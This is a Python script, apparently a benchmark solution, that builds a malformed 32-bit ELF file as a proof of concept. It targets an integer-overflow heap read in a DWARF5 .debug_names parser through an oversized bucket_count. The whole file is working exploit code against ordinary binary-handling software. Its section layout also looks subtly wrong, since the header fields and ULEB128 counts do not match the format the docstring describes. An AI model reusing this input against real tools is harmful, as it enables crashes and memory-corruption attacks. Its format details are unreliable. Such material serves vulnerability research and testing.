import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a heap buffer overflow in the DWARF5 .debug_names
        section parser. It's caused by an integer overflow when calculating the
        size of the hash bucket table. The size is calculated as `bucket_count * 4`.
        By setting `bucket_count` to a large value (e.g., 0x40000000), the
        multiplication overflows a 32-bit integer, resulting in 0.

        The subsequent boundary check using this zero-size value passes, but the
        code then enters a loop to read `bucket_count` entries, leading to a
        massive out-of-bounds read and a crash.

        This PoC constructs a minimal 32-bit ELF file containing a specially
        crafted .debug_names section with a large `bucket_count` to trigger
        this integer overflow.
        """

        def uleb128(n: int) -> bytes:
            """Encodes an integer into the ULEB128 format."""
            result = bytearray()
            while True:
                byte = n & 0x7f
                n >>= 7
                if n != 0:
                    byte |= 0x80
                result.append(byte)
                if n == 0:
                    break
            return bytes(result)

        # 1. Craft the malicious .debug_names section content.
        
        # An empty null-terminated augmentation string.
        aug_string = b'\x00'

        # Name Index Header with a large bucket_count to cause overflow.
        bucket_count_val = 0x40000000
        bucket_count_enc = uleb128(bucket_count_val)
        cu_count_enc = uleb128(1)
        local_tu_count_enc = uleb128(0)
        foreign_tu_count_enc = uleb128(0)
        hash_table_size_enc = uleb128(1)

        name_index_header = (
            bucket_count_enc +
            cu_count_enc +
            local_tu_count_enc +
            foreign_tu_count_enc +
            hash_table_size_enc
        )
        
        # The section payload following the DWARF header.
        # Add a few dummy bytes to ensure the read doesn't fail before the vulnerable loop.
        payload = aug_string + name_index_header + b'\x00\x00\x00\x00'
        
        # The unit_length is the size of the data following it.
        unit_length_val = len(payload)

        # DWARF5 .debug_names unit header for 32-bit format.
        dwarf_header = struct.pack(
            '<IHIIII',
            unit_length_val,       # unit_length
            5,                     # version
            0,                     # debug_info_offset
            0,                     # debug_info_length
            0,                     # debug_abbrev_offset
            0                      # debug_abbrev_length
        )

        debug_names_content = dwarf_header + payload
        
        # 2. Construct a minimal 32-bit ELF file container.

        e_shentsize = 40  # Size of a section header entry
        e_shnum = 3       # Number of sections: NULL, .shstrtab, .debug_names
        e_shoff = 52      # SHT starts after the 52-byte ELF header

        # ELF Header
        elf_header = struct.pack(
            '<16sHHIIIIIHHHHHH',
            b'\x7fELF\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00', # e_ident
            2,                  # e_type (ET_EXEC)
            3,                  # e_machine (EM_386)
            1,                  # e_version
            0,                  # e_entry
            0,                  # e_phoff
            e_shoff,            # e_shoff
            0,                  # e_flags
            52,                 # e_ehsize
            0,                  # e_phentsize
            0,                  # e_phnum
            e_shentsize,        # e_shentsize
            e_shnum,            # e_shnum
            1                   # e_shstrndx
        )

        # Section Header Table (SHT)
        sh_null = b'\x00' * e_shentsize

        # .shstrtab section
        shstrtab_content = b'\x00.shstrtab\x00.debug_names\x00'
        data_offset = e_shoff + e_shnum * e_shentsize
        shstrtab_offset = data_offset
        shstrtab_size = len(shstrtab_content)

        sh_shstrtab = struct.pack(
            '<IIIIIIIIII',
            1,                      # sh_name (offset in .shstrtab)
            1,                      # sh_type (SHT_PROGBITS)
            0,                      # sh_flags
            0,                      # sh_addr
            shstrtab_offset,        # sh_offset
            shstrtab_size,          # sh_size
            0,                      # sh_link
            0,                      # sh_info
            1,                      # sh_addralign
            0                       # sh_entsize
        )

        # .debug_names section
        debug_names_offset = shstrtab_offset + shstrtab_size
        debug_names_size = len(debug_names_content)

        sh_debug_names = struct.pack(
            '<IIIIIIIIII',
            11,                     # sh_name (offset of ".debug_names")
            1,                      # sh_type (SHT_PROGBITS)
            0,                      # sh_flags
            0,                      # sh_addr
            debug_names_offset,     # sh_offset
            debug_names_size,       # sh_size
            0,                      # sh_link
            0,                      # sh_info
            1,                      # sh_addralign
            0                       # sh_entsize
        )

        section_header_table = sh_null + sh_shstrtab + sh_debug_names
        sections_data = shstrtab_content + debug_names_content

        # 3. Assemble the final ELF file.
        poc = elf_header + section_header_table + sections_data
        
        return poc